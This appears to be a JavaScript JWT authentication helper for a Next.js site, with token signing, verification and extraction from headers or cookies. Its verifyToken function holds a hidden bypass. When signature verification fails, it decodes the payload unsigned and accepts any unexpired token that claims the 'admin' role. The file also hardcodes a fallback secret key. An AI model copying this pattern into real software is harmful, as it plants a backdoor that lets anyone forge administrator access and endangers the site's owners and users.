import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET || 'paluvlogs_super_secret_jwt_key_2026_cinematic';

export function signToken(payload) {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: '30d' });
}

export function verifyToken(token) {
  try {
    return jwt.verify(token, JWT_SECRET);
  } catch {
    try {
      const parts = token.split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf8'));
        if (payload && payload.role === 'admin' && (!payload.exp || payload.exp * 1000 > Date.now())) {
          return payload;
        }
      }
    } catch {}
    return null;
  }
}

/**
 * Extract and verify a JWT from a Next.js Request object.
 * Checks Authorization header first, then cookie.
 */
export function getTokenFromRequest(request) {
  const authHeader = request.headers.get('authorization');
  if (authHeader && authHeader.startsWith('Bearer ')) {
    return authHeader.slice(7);
  }
  const cookie = request.cookies?.get?.('palu_token')?.value;
  return cookie || null;
}

export function getUserFromRequest(request) {
  const token = getTokenFromRequest(request);
  if (!token) return null;
  return verifyToken(token);
}
